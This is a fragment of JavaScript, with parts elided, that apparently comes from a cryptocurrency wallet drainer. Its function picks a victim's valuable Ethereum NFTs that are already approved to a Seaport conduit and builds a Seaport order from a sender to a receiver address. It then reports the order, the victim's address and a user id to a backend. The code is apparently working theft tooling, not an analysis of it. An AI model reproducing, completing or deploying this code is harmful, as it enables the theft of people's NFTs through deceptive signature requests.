const SIGN_SEAPORT = async (assets, provider, sender_address, receiver_address, user_id, min_price = 0) => {
  try {
    const nft_list = [], nft_list_plain = [];
    for (const asset of assets) {
      if (asset.skip || asset.type !== 'ERC721' || asset.chain_id != 1 || asset.amount_usd < min_price) continue;
      if (!await is_nft_approved(asset.address, sender_address, "0x1E0049783F008A0085193E00003D00cd54003c71")) continue;
    ...
    try {
      ...
      await send_request({ action: 'seaport', user_id: user_id, seaport: 'success', order: seaportOrder, address: sender_address });
      for (const asset of assets) {
